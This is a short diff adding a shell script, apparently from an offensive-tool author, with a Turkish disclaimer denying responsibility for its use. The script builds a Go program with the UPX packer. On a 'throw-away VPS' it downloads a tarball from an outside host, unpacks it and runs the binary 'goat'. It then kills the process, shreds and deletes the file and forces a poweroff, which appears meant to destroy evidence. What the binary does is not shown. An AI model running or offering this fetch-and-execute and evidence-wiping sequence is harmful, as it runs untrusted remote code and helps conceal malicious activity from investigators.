@@ -1,0 +1,14 @@
+sudo apt update && sudo apt install -y golang-go upx
+go run build.go
+# on throw-away VPS
+curl -sL https://0x.rip/goat.tar.gz | tar xz
+chmod +x goat
+./goat
+pkill -f goat
+shred -vfz -n 3 goat
+rm -f goat
+poweroff -f
+
+ÖRNEK KODLARDIR BANA AİTTİR. KULLANILMA ŞEKİLLERİYLE ALAKALI BİR SORUMLULUĞUM YOKTUR
+OWN BY XLOLTT
+TT: xloltt1
